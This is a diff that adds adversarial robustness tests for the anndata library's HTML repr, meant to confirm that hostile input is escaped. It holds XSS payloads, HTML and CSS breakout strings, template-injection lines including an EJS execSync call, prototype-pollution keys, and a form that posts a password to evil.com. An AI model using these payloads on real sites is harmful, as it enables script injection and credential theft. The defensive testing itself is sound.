@@ -2122,6 +2122,24 @@ For more details, see the full documentation.
         "native title attribute). The tooltip shows the first 500 characters of the README.",
     ))
 
+    # Test 18b: README truncation (large README)
+    print("  18b. README Truncation (large README)")
+    adata_large_readme = ad.AnnData(np.zeros((5, 5)))
+    # Create a README larger than 100KB (default limit)
+    large_readme = "# Large README\n\n" + "This is a very long README. " * 5000  # ~150KB
+    adata_large_readme.uns["README"] = large_readme
+
+    large_readme_html = adata_large_readme._repr_html_()
+    sections.append((
+        "18b. README Truncation (Large README)",
+        large_readme_html,
+        f"Tests README truncation. The original README is ~{len(large_readme):,} characters. "
+        "The default limit is 100,000 characters (configurable via "
+        "<code>anndata.settings.repr_html_max_readme_size</code>). "
+        "Click the ⓘ icon to see the modal - it should show the truncated content with a note "
+        "at the bottom indicating how much was truncated.",
+    ))
+
     # Test 19: MuData (multimodal data)
     # This demonstrates how MuData can reuse anndata's repr by:
     # 1. Registering a SectionFormatter for the .mod attribute (done at import time above)
@@ -2477,6 +2495,581 @@ For more details, see the full documentation.
         "<li><code>var.normal_col</code> - Normal float values</li>"
         "<li><code>var.string_col</code> - String values</li>"
         "<li><code>uns.valid_dict</code> - Dict with serializable values</li>"
+        "</ul>",
+    ))
+
+    # Test 24: ULTIMATE EVIL - The WORST possible adversarial robustness test
+    # Includes EVERYTHING that could possibly break a repr:
+    # - XSS injection (script, img onerror, svg onload, javascript:)
+    # - HTML/CSS breakout (</style>, </div>, css expressions)
+    # - Unicode bombs (emoji, CJK, RTL override, Zalgo, null bytes)
+    # - CRASHING OBJECTS (broken __repr__, __len__, __str__, properties)
+    # - Circular references (dict containing itself)
+    # - Infinite-like data (len = 10^18)
+    # - Huge categoricals (10,000 categories!)
+    # - Giant strings (50KB+)
+    # - Deeply nested structures (15+ levels)
+    print("  24a. Ultimate Evil AnnData (Adversarial Robustness)")
+
+    # === DEFINE CRASHING/EVIL OBJECT CLASSES ===
+
+    class ExplodingRepr:
+        """Object whose __repr__ crashes."""
+        def __repr__(self):
+            raise RuntimeError("BOOM! __repr__ exploded")
+
+    class ExplodingLen:
+        """Object whose __len__ crashes."""
+        def __len__(self):
+            raise MemoryError("BOOM! __len__ exploded")
+
+    class ExplodingStr:
+        """Object whose __str__ crashes."""
+        def __str__(self):
+            raise ValueError("BOOM! __str__ exploded")
+        def __repr__(self):
+            return "ExplodingStr(str crashes)"
+
+    class LyingObject:
+        """Object that lies about all its properties."""
+        @property
+        def shape(self):
+            raise AttributeError("I have no shape")
+        @property
+        def dtype(self):
+            raise AttributeError("I have no dtype")
+        def __len__(self):
+            raise AttributeError("I have no length")
+        def __repr__(self):
+            return "LyingObject(all properties lie)"
+        def __str__(self):
+            raise AttributeError("I have no str")
+
+    class InfiniteLen:
+        """Object claiming impossibly large length."""
+        def __len__(self):
+            return 10**18  # 1 quintillion items
+        def __repr__(self):
+            return "InfiniteLen(10^18 items)"
+
+    class ExplodingShape:
+        """Object whose shape property explodes."""
+        @property
+        def shape(self):
+            raise TypeError("BOOM! shape exploded")
+        def __repr__(self):
+            return "ExplodingShape(.shape crashes)"
+
+    class ExplodingDtype:
+        """Object whose dtype property explodes."""
+        shape = (10, 10)  # Normal shape
+        @property
+        def dtype(self):
+            raise TypeError("BOOM! dtype exploded")
+        def __repr__(self):
+            return "ExplodingDtype(.dtype crashes)"
+
+    # === THE EVIL ANNDATA ===
+    adata_evil = ad.AnnData(X=np.random.rand(50, 30).astype(np.float32))
+
+    # XSS injection attempts (6 variants)
+    adata_evil.obs["normal_column"] = np.random.choice(["A", "B", "C"], size=50)
+    adata_evil.obs['<script>alert("XSS")</script>'] = np.random.randint(0, 10, size=50)
+    adata_evil.obs["<img onerror=alert(1)>"] = np.random.rand(50)
+    adata_evil.obs['onclick="evil()"'] = np.random.rand(50)
+    adata_evil.obs['<svg onload=alert(1)>'] = np.random.rand(50)
+    adata_evil.obs['javascript:alert(1)'] = np.random.rand(50)
+
+    # Unicode bombs
+    adata_evil.obs["emoji_\U0001F4A9_poop"] = np.random.rand(50)
+    adata_evil.obs["chinese_\u4e2d\u6587"] = pd.Categorical(
+        np.random.choice(["cat", "dog", "bird"], size=50)
+    )
+    adata_evil.obs["rtl_\u202eEVIL\u202c_override"] = np.random.rand(50)
+    adata_evil.obs["null\x00byte\x00col"] = np.random.rand(50)
+
+    # HTML/CSS breakout
+    adata_evil.var["gene_normal"] = [f"gene_{i}" for i in range(30)]
+    adata_evil.var["</style><script>bad()</script>"] = np.random.rand(30)
+    adata_evil.var["</div></div></div>breakout"] = np.random.rand(30)
+
+    # CRASHING OBJECTS in uns
+    adata_evil.uns["normal"] = {"key": "value", "nested": {"a": 1, "b": 2}}
+    adata_evil.uns["exploding_repr"] = ExplodingRepr()
+    adata_evil.uns["exploding_len"] = ExplodingLen()
+    adata_evil.uns["exploding_str"] = ExplodingStr()
+    adata_evil.uns["lying_object"] = LyingObject()
+    adata_evil.uns["infinite_len"] = InfiniteLen()
+    adata_evil.uns["exploding_shape"] = ExplodingShape()
+    adata_evil.uns["exploding_dtype"] = ExplodingDtype()
+
+    # UNKNOWN TYPE WARNING (orange text) - object pretending to be from anndata package
+    class FakeAnndataType:
+        """Unknown type from anndata package triggers warning (not error)."""
+        __module__ = "anndata.experimental.fake"
+        def __repr__(self):
+            return "FakeAnndataType()"
+    adata_evil.uns["unknown_anndata_type"] = FakeAnndataType()
+
+    # EVIL README - tests the readme modal with all kinds of malicious content
+    evil_readme = """# Evil README - XSS and Injection Test
+
+## XSS Attempts
+<script>alert('XSS in readme!')</script>
+<img src=x onerror="alert('img onerror')">
+<svg onload="alert('svg onload')">
+<body onload="alert('body onload')">
+<iframe src="javascript:alert('iframe')"></iframe>
+<a href="javascript:alert('href')">Click me</a>
+<div onclick="alert('onclick')">Click this div</div>
+<input onfocus="alert('onfocus')" autofocus>
+<marquee onstart="alert('marquee')">test</marquee>
+<video><source onerror="alert('video')"></video>
+
+## HTML Injection
+</div></div></div></table></section>
+<style>body { display: none !important; }</style>
+<style>* { background: red !important; color: white !important; }</style>
+<link rel="stylesheet" href="http://evil.com/evil.css">
+
+## CSS Injection
+<div style="position:fixed;top:0;left:0;width:100%;height:100%;background:red;z-index:99999;">
+PWNED
+</div>
+
+## Markdown Edge Cases
+[Evil Link](javascript:alert('markdown_link'))
+![Evil Image](x" onerror="alert('markdown_img'))
+`<script>alert('in code')</script>`
+
+```html
+<script>alert('in code block')</script>
+```
+
+## Unicode Chaos
+RTL Override: \u202eSIHT DAER\u202c (should appear reversed)
+Null bytes: before\x00teleporting\x00after
+Zero-width: before\u200b\u200b\u200bafter (invisible chars)
+Combining: e\u0301\u0301\u0301\u0301\u0301 (many accents)
+Emoji bomb: 💀💀💀💀💀💀💀💀💀💀💀💀💀💀💀💀💀💀💀💀
+Zalgo: H̸̡̪̯ͨ͊̽̅̾ḛ̫̞̜̹̙̈́͊̓̑̄̏ c̷̶̻̠̜̲̗̠̪o̶̜̹̠̺̗m̴̨̙̝̯͕̥̞̥͉̲e̴͕̫͉̮͇̣̮̼̱̤s̵̨͖̖̱̻̣͙̥̱͓
+
+## Nested Markdown (should not execute)
+<div>
+# Heading inside div
+**Bold** and *italic*
+</div>
+
+## Form Injection
+<form action="http://evil.com/steal">
+<input name="password" type="password">
+<button type="submit">Submit</button>
+</form>
+
+## Meta Tags
+<meta http-equiv="refresh" content="0;url=http://evil.com">
+<base href="http://evil.com/">
+
+## Object/Embed
+<object data="http://evil.com/evil.swf"></object>
+<embed src="http://evil.com/evil.swf">
+
+## Event Handlers (comprehensive)
+<div onmouseover="alert('mouseover')">Hover me</div>
+<div onmouseout="alert('mouseout')">Leave me</div>
+<div onmousedown="alert('mousedown')">Click me</div>
+<div onmouseup="alert('mouseup')">Release me</div>
+<div ondblclick="alert('dblclick')">Double click</div>
+<div oncontextmenu="alert('contextmenu')">Right click</div>
+<div onkeydown="alert('keydown')">Type here</div>
+<div ondrag="alert('drag')">Drag me</div>
+<div oncopy="alert('copy')">Copy me</div>
+<div onpaste="alert('paste')">Paste here</div>
+
+## Data URIs
+<a href="data:text/html,<script>alert('data_uri')</script>">Data URI</a>
+<img src="data:image/svg+xml,<svg onload='alert(1)'>">
+
+## Template Injection
+{{constructor.constructor('alert(1)')()}}
+${alert('template_literal')}
+#{alert('ruby_interpolation')}
+
+The end. If you see this without any alerts or broken layout, the sanitization works!
+
+## Size Bomb (50KB of repeated text below)
+""" + "A" * 50000
+    adata_evil.uns["README"] = evil_readme
+
+    # CIRCULAR REFERENCE (dict)
+    circular_dict = {"level1": {"level2": {}}}
+    circular_dict["level1"]["level2"]["back_to_start"] = circular_dict
+    adata_evil.uns["circular_dict"] = circular_dict
+
+    # CIRCULAR REFERENCE (AnnData self-reference)
+    adata_evil.uns["self_reference"] = adata_evil
+
+    # CIRCULAR REFERENCE (nested AnnData with parent reference)
+    child_adata = ad.AnnData(np.zeros((5, 5)))
+    child_adata.uns["parent_ref"] = adata_evil
+    adata_evil.uns["child_with_parent_ref"] = child_adata
+
+    # DEEPLY NESTED - 15 levels
+    deeply_nested = {}
+    current = deeply_nested
+    for i in range(15):
+        current[f"level_{i}"] = {}
+        current = current[f"level_{i}"]
+    current["bottom"] = "reached the bottom!"
+    adata_evil.uns["deeply_nested_15_levels"] = deeply_nested
+
+    # XSS in uns keys
+    adata_evil.uns["<script>evil()</script>"] = "XSS key"
+
+    # GIANT STRING - 50KB
+    adata_evil.uns["giant_string_50kb"] = "X" * 50_000
+
+    # MANY ITEMS - 500 items
+    adata_evil.uns["many_items_500"] = {f"item_{i:04d}": i for i in range(500)}
+
+    # HUGE categorical (10,000 categories!)
+    huge_cats = [f"category_{i:05d}" for i in range(10000)]
+    adata_evil.obs["huge_categorical_10k"] = pd.Categorical(
+        np.random.choice(huge_cats[:50], size=50),
+        categories=huge_cats
+    )
+
+    # === MANY ENTRIES IN ONE SECTION ===
+    # Test that sections with many entries are truncated (default max is 200)
+    # Create one valid entry, then directly populate internal store to skip validation
+    tiny_sparse = sp.csr_matrix(([1.0], ([0], [0])), shape=(30, 30))
+    adata_evil.varp["varp_000"] = tiny_sparse  # One valid entry to initialize
+    # Directly add to internal store (bypasses slow validation)
+    for i in range(1, 300):
+        adata_evil.varp._data[f"varp_{i:03d}"] = tiny_sparse
+
+    # BAD COLORS - various malformed color arrays
+    # Too many colors (more than categories)
+    adata_evil.obs["cat_too_many_colors"] = pd.Categorical(
+        np.random.choice(["A", "B", "C"], size=50)
+    )
+    adata_evil.uns["cat_too_many_colors_colors"] = ["red", "green", "blue", "yellow", "purple", "orange"]
+
+    # Too few colors (fewer than categories)
+    adata_evil.obs["cat_too_few_colors"] = pd.Categorical(
+        np.random.choice(["X", "Y", "Z", "W"], size=50)
+    )
+    adata_evil.uns["cat_too_few_colors_colors"] = ["red"]
+
+    # Non-colors (invalid color strings)
+    adata_evil.obs["cat_bad_colors"] = pd.Categorical(
+        np.random.choice(["alpha", "beta"], size=50)
+    )
+    adata_evil.uns["cat_bad_colors_colors"] = ["not_a_color", "also_invalid"]
+
+    # Strange formats
+    adata_evil.obs["cat_strange_colors"] = pd.Categorical(
+        np.random.choice(["one", "two", "three"], size=50)
+    )
+    adata_evil.uns["cat_strange_colors_colors"] = [
+        "#FF0000",  # Valid hex
+        "rgb(0,255,0)",  # Valid RGB
+        "rgba(0,0,255,0.5)",  # Valid RGBA
+    ]
+
+    # Empty colors array
+    adata_evil.obs["cat_empty_colors"] = pd.Categorical(
+        np.random.choice(["p", "q"], size=50)
+    )
+    adata_evil.uns["cat_empty_colors_colors"] = []
+
+    # NESTED ANNDATA WITH ERRORS (should show yellow/red rows in nested content)
+    nested_with_errors = ad.AnnData(np.zeros((10, 10)))
+    nested_with_errors.uns["bad_obj_in_nested"] = ExplodingRepr()
+    nested_with_errors.uns["another_bad"] = LyingObject()
+    adata_evil.uns["nested_adata_with_errors"] = nested_with_errors
+
+    # OBJECT WITH VERY LONG ERROR MESSAGE (in uns to test truncation)
+    class VeryLongErrorObject:
+        """Object that produces a very long error message."""
+        @property
+        def shape(self):
+            raise TypeError(
+                "This is a VERY LONG ERROR MESSAGE that should be properly truncated. " * 10 +
+                "It contains lots of details about what went wrong: " +
+                "ValueError: The input array has shape (100, 200, 300) but expected (50, 100). " +
+                "Additional context: This error occurred while processing the data matrix. " +
+                "Stack trace would go here with many lines of debugging information. " * 5
+            )
+        def __repr__(self):
+            return "VeryLongErrorObject(produces long error)"
+
+    adata_evil.uns["long_error_object_uns"] = VeryLongErrorObject()
+
+    # Add long error object to varm (bypass validation via internal store)
+    adata_evil.varm["gene_scores"] = np.random.rand(30, 5)  # Need at least one valid entry
+    adata_evil.varm._data["long_error_object"] = VeryLongErrorObject()
+
+    # Standard sections to show they still work
+    adata_evil.obsm["X_pca"] = np.random.rand(50, 10)
+    adata_evil.obsm["X_umap"] = np.random.rand(50, 2)
+    adata_evil.layers["raw_counts"] = np.random.randint(0, 100, (50, 30))
+    adata_evil.obsp["connectivities"] = sp.random(50, 50, density=0.1, format="csr")
+
+    # Suppress warnings from crashing objects during repr generation
+    # (The warnings are expected - we're testing that repr handles them gracefully)
+    with warnings.catch_warnings():
+        warnings.simplefilter("ignore")
+        evil_html = adata_evil._repr_html_()
+
+    sections.append((
+        "24a. Evil AnnData - Basic Attacks",
+        evil_html,
+        "<b>Basic adversarial scenarios:</b> XSS injection, HTML/CSS breakout, "
+        "Unicode bombs, crashing objects, circular references, and size bombs.<br><br>"
+        "<b>Crashing objects in uns (errors shown in red in preview column):</b><br>"
+        "<ul>"
+        "<li><code>exploding_repr</code> - __repr__ raises RuntimeError</li>"
+        "<li><code>exploding_len</code> - __len__ raises MemoryError</li>"
+        "<li><code>exploding_str</code> - __str__ raises ValueError</li>"
+        "<li><code>lying_object</code> - shape/dtype/len/str all raise AttributeError</li>"
+        "<li><code>infinite_len</code> - len() returns 10^18 (suspicious)</li>"
+        "<li><code>exploding_shape</code> - .shape property raises TypeError</li>"
+        "<li><code>exploding_dtype</code> - .dtype property raises TypeError</li>"
+        "<li><code>long_error_object_uns</code> - very long error message (should truncate)</li>"
+        "<li><code>unknown_anndata_type</code> - unknown type warning shown in orange</li>"
+        "</ul>"
+        "<b>Evil README (click icon to open modal):</b><br>"
+        "<ul>"
+        "<li>XSS attempts: script, img onerror, svg onload, iframe, event handlers</li>"
+        "<li>HTML injection: closing tags, style injection, link injection</li>"
+        "<li>CSS injection: position fixed overlay</li>"
+        "<li>Markdown edge cases: javascript: links, malformed images</li>"
+        "<li>Unicode chaos: RTL override, null bytes, zero-width, zalgo text</li>"
+        "<li>Size bomb: 50KB of repeated characters</li>"
+        "<li>Form injection, meta refresh, data URIs, template injection</li>"
+        "</ul>"
+        "<b>Crashing object in varm:</b><br>"
+        "<ul>"
+        "<li><code>long_error_object</code> - very long error message (should truncate)</li>"
+        "</ul>"
+        "<b>Circular references:</b><br>"
+        "<ul>"
+        "<li><code>circular_dict</code> - dict that contains itself</li>"
+        "<li><code>self_reference</code> - AnnData references itself</li>"
+        "<li><code>child_with_parent_ref</code> - nested AnnData with circular parent reference</li>"
+        "</ul>"
+        "<b>Extreme nesting:</b><br>"
+        "<ul><li><code>deeply_nested_15_levels</code> - 15 levels of nested dicts</li></ul>"
+        "<b>XSS injection in obs column names:</b><br>"
+        "<ul>"
+        "<li><code>&lt;script&gt;alert('XSS')&lt;/script&gt;</code></li>"
+        "<li><code>&lt;img onerror=alert(1)&gt;</code></li>"
+        "<li><code>onclick='evil()'</code></li>"
+        "<li><code>&lt;svg onload=alert(1)&gt;</code></li>"
+        "<li><code>javascript:alert(1)</code></li>"
+        "</ul>"
+        "<b>XSS in uns keys:</b><br>"
+        "<ul><li><code>&lt;script&gt;evil()&lt;/script&gt;</code></li></ul>"
+        "<b>HTML/CSS breakout in var:</b><br>"
+        "<ul>"
+        "<li><code>&lt;/style&gt;&lt;script&gt;bad()&lt;/script&gt;</code></li>"
+        "<li><code>&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;breakout</code></li>"
+        "</ul>"
+        "<b>Unicode stress in obs:</b><br>"
+        "<ul>"
+        "<li><code>emoji_poop</code> - emoji character</li>"
+        "<li><code>chinese_中文</code> - CJK characters</li>"
+        "<li><code>rtl_LIVE_override</code> - RTL override</li>"
+        "<li><code>null\\x00byte\\x00col</code> - null bytes</li>"
+        "</ul>"
+        "<b>Size bombs:</b><br>"
+        "<ul>"
+        "<li><code>huge_categorical_10k</code> - 10,000 categories in obs</li>"
+        "<li><code>giant_string_50kb</code> - 50KB string in uns</li>"
+        "<li><code>many_items_500</code> - dict with 500 items in uns</li>"
+        "</ul>"
+        "<b>Many entries in varp (tests truncation):</b><br>"
+        "<ul>"
+        "<li><code>varp_000</code> to <code>varp_299</code> - 300 arrays (truncated to 200)</li>"
+        "</ul>"
+        "<b>Bad colors in obs (with _colors in uns):</b><br>"
+        "<ul>"
+        "<li><code>cat_too_many_colors</code> - 6 colors for 3 categories</li>"
+        "<li><code>cat_too_few_colors</code> - 1 color for 4 categories</li>"
+        "<li><code>cat_bad_colors</code> - invalid color strings</li>"
+        "<li><code>cat_strange_colors</code> - hex, rgb(), rgba() formats</li>"
+        "<li><code>cat_empty_colors</code> - empty colors array</li>"
+        "</ul>"
+        "<b>Nested AnnData with errors:</b><br>"
+        "<ul>"
+        "<li><code>nested_adata_with_errors</code> - contains <code>bad_obj_in_nested</code> and <code>another_bad</code></li>"
+        "<li>Should show yellow/red row backgrounds in nested content</li>"
+        "</ul>"
+        "<b>Expected behavior:</b><br>"
+        "<ul>"
+        "<li>Errors shown in <span style='color:red;'>red</span> in preview column</li>"
+        "<li>Warnings shown in <span style='color:orange;'>orange</span> in preview column</li>"
+        "<li>Warning/error rows have colored backgrounds (yellow/red)</li>"
+        "<li>XSS is escaped (no script execution)</li>"
+        "<li>Large data is truncated</li>"
+        "<li>No crashes</li>"
+        "</ul>",
+    ))
+
+    # Test 24b: Advanced Adversarial Attacks
+    # SVG XSS, mutation XSS, prototype pollution, bidi spoofing, template injection
+    print("  24b. Evil AnnData - Advanced Attacks")
+
+    adata_advanced = ad.AnnData(X=np.random.rand(20, 15).astype(np.float32))
+
+    # === UNICODE LOOKALIKES (confusable characters) ===
+    # Not a security issue, but tests correct Unicode display
+    adata_advanced.obs["normal_name"] = np.random.rand(20)
+    adata_advanced.obs["n\u0430me_cyrillic_a"] = np.random.rand(20)  # Cyrillic а
+    adata_advanced.obs["n\u0435w_cyrillic_e"] = np.random.rand(20)  # Cyrillic е
+    # Greek lookalikes (ο=U+03BF looks like o)
+    adata_advanced.obs["z\u03BFne_greek_o"] = np.random.rand(20)  # Greek ο
+    # Fullwidth lookalikes (Ａ=U+FF21 looks like A)
+    adata_advanced.obs["\uFF21\uFF22\uFF23_fullwidth"] = np.random.rand(20)
+
+    # === ZERO-WIDTH DECEPTION ===
+    # Invisible characters that could hide content
+    adata_advanced.obs["visible\u200Bhidden\u200Btext"] = np.random.rand(20)  # Zero-width space
+    adata_advanced.obs["join\u200Der_test"] = np.random.rand(20)  # Zero-width joiner
+    adata_advanced.obs["word\u2060breaker"] = np.random.rand(20)  # Word joiner
+    # Invisible separator attack
+    adata_advanced.uns["safe\u2063key"] = "invisible separator in key"
+
+    # === BIDI SPOOFING (Trojan Source - CVE-2021-42574) ===
+    # RLI (Right-to-Left Isolate) + PDI (Pop Directional Isolate)
+    adata_advanced.obs["user\u2067admin\u2069_bidi"] = np.random.rand(20)
+    adata_advanced.uns["access\u202Edenied\u202C"] = "RLO attack"  # Right-to-Left Override
+    # Homoglyph + Bidi combo
+    adata_advanced.uns["file\u2066\u2069.exe"] = "hidden extension"
+
+    # === DOM CLOBBERING ===
+    # Names that could clobber window/document properties
+    adata_advanced.uns["document"] = "clobber attempt"
+    adata_advanced.uns["window"] = "clobber attempt"
+    adata_advanced.uns["location"] = "clobber attempt"
+    adata_advanced.uns["__proto__"] = {"polluted": True}
+    adata_advanced.uns["constructor"] = "pollution attempt"
+    adata_advanced.uns["prototype"] = {"evil": "value"}
+
+    # === CSS ATTACKS ===
+    # These should be escaped, not interpreted
+    adata_advanced.var["@keyframes evil { }"] = np.random.rand(15)
+    adata_advanced.var["filter: blur(100px)"] = np.random.rand(15)
+    adata_advanced.var["cursor: url(evil.cur)"] = np.random.rand(15)
+    adata_advanced.uns["css_animation"] = "@keyframes spin { from { transform: rotate(0); } }"
+    adata_advanced.uns["css_content"] = "content: attr(data-secret)"
+
+    # === SVG XSS ===
+    adata_advanced.uns["svg_script"] = "<svg><script>alert(1)</script></svg>"
+    adata_advanced.uns["svg_foreignobject"] = "<svg><foreignObject><body onload=alert(1)></foreignObject></svg>"
+    adata_advanced.uns["svg_use"] = "<svg><use href='data:image/svg+xml,<svg onload=alert(1)>'></use></svg>"
+    adata_advanced.uns["svg_animate"] = "<svg><animate onbegin=alert(1)></animate></svg>"
+
+    # === MUTATION XSS (mXSS) ===
+    # Malformed HTML that could mutate during parsing
+    adata_advanced.uns["mxss_img"] = "<img src=x onerror=alert(1)//"  # Missing >
+    adata_advanced.uns["mxss_cdata"] = "<svg><![CDATA[><script>alert(1)</script>]]>"
+    adata_advanced.uns["mxss_noscript"] = '<noscript><p title="</noscript><script>alert(1)</script>">'
+    adata_advanced.uns["mxss_double_lt"] = "<<script>alert(1)</script>"
+    adata_advanced.uns["mxss_nested_tag"] = "<div<script>alert(1)</script>>"
+
+    # === ENCODING ATTACKS ===
+    adata_advanced.uns["null_byte"] = "before\x00after"  # Actual null byte
+    adata_advanced.uns["utf7_script"] = "+ADw-script+AD4-alert(1)+ADw-/script+AD4-"
+    adata_advanced.uns["bom_prefix"] = "\ufeffevil_content"  # Byte Order Mark
+    adata_advanced.uns["overlong_lt"] = "\xc0\xbc"  # Overlong encoding of <
+
+    # === PROTOTYPE POLLUTION PATTERNS ===
+    adata_advanced.uns["__proto__"] = {"isAdmin": True}
+    adata_advanced.uns["constructor.prototype.isAdmin"] = True
+    adata_advanced.uns["__defineGetter__"] = "pollution"
+
+    # === ACCESSIBILITY ATTACKS ===
+    adata_advanced.uns["aria_spoof"] = 'aria-label="Click to win $1000"'
+    adata_advanced.uns["role_spoof"] = 'role="button" aria-pressed="false"'
+    adata_advanced.uns["hidden_content"] = '<span aria-hidden="false" style="display:none">secret</span>'
+
+    # === TEMPLATE INJECTION ===
+    adata_advanced.uns["angular_inject"] = "{{constructor.constructor('alert(1)')()}}"
+    adata_advanced.uns["vue_inject"] = "{{_c.constructor('alert(1)')()}}"
+    adata_advanced.uns["jinja_inject"] = "{{ config.items() }}"
+    adata_advanced.uns["ejs_inject"] = "<%= global.process.mainModule.require('child_process').execSync('id') %>"
+
+    with warnings.catch_warnings():
+        warnings.simplefilter("ignore")
+        advanced_html = adata_advanced._repr_html_()
+
+    sections.append((
+        "24b. Evil AnnData - Advanced Attacks",
+        advanced_html,
+        "<b>Advanced attack vectors</b> beyond basic XSS - tests SVG injection, mutation XSS, "
+        "prototype pollution, bidi spoofing, and template injection patterns.<br><br>"
+        "<b>Unicode Lookalikes (confusable characters):</b><br>"
+        "<ul>"
+        "<li>Cyrillic а (U+0430) looks like Latin a</li>"
+        "<li>Cyrillic е (U+0435) looks like Latin e</li>"
+        "<li>Greek ο (U+03BF) looks like Latin o</li>"
+        "<li>Fullwidth ＡＢＣ looks like ABC</li>"
+        "<li><i>Not a security issue - tests correct Unicode display</i></li>"
+        "</ul>"
+        "<b>Zero-Width Characters (invisible):</b><br>"
+        "<ul>"
+        "<li>Zero-width space (U+200B) - invisible separator</li>"
+        "<li>Zero-width joiner (U+200D) - invisible connector</li>"
+        "<li>Word joiner (U+2060) - invisible non-breaking</li>"
+        "<li>Invisible separator (U+2063) - in uns key</li>"
+        "</ul>"
+        "<b>Bidi Spoofing (Trojan Source CVE-2021-42574):</b><br>"
+        "<ul>"
+        "<li>RLI/PDI (U+2067/U+2069) - reverses text direction</li>"
+        "<li>RLO/PDF (U+202E/U+202C) - right-to-left override</li>"
+        "<li>Can make text appear reversed or reordered</li>"
+        "</ul>"
+        "<b>DOM Clobbering Patterns:</b><br>"
+        "<ul>"
+        "<li>Keys named 'document', 'window', 'location'</li>"
+        "<li>Keys named '__proto__', 'constructor', 'prototype'</li>"
+        "<li><i>Tests these appear as literal text, not interpreted</i></li>"
+        "</ul>"
+        "<b>CSS Injection Patterns:</b><br>"
+        "<ul>"
+        "<li>@keyframes, filter:, cursor: url()</li>"
+        "<li><i>Should appear as escaped text</i></li>"
+        "</ul>"
+        "<b>SVG XSS:</b><br>"
+        "<ul>"
+        "<li>SVG with script tag, foreignObject, use element, animate</li>"
+        "<li><i>All SVG tags should be escaped</i></li>"
+        "</ul>"
+        "<b>Mutation XSS (mXSS):</b><br>"
+        "<ul>"
+        "<li>Malformed HTML that could mutate during parsing</li>"
+        "<li>Missing closing brackets, CDATA breakout, nested tags</li>"
+        "</ul>"
+        "<b>Encoding Attacks:</b><br>"
+        "<ul>"
+        "<li>Null bytes, UTF-7 encoded script, BOM prefix</li>"
+        "</ul>"
+        "<b>Prototype Pollution Patterns:</b><br>"
+        "<ul>"
+        "<li>__proto__, constructor.prototype keys</li>"
+        "</ul>"
+        "<b>Template Injection:</b><br>"
+        "<ul>"
+        "<li>Angular/Vue/Jinja/EJS template syntax</li>"
+        "<li><i>Should appear as literal text</i></li>"
+        "</ul>"
+        "<b>Expected behavior:</b><br>"
+        "<ul>"
+        "<li>All content should be escaped and visible as text</li>"
+        "<li>No script execution, CSS injection, or DOM manipulation</li>"
+        "<li>No crashes or hangs</li>"
         "</ul>",
     ))
 
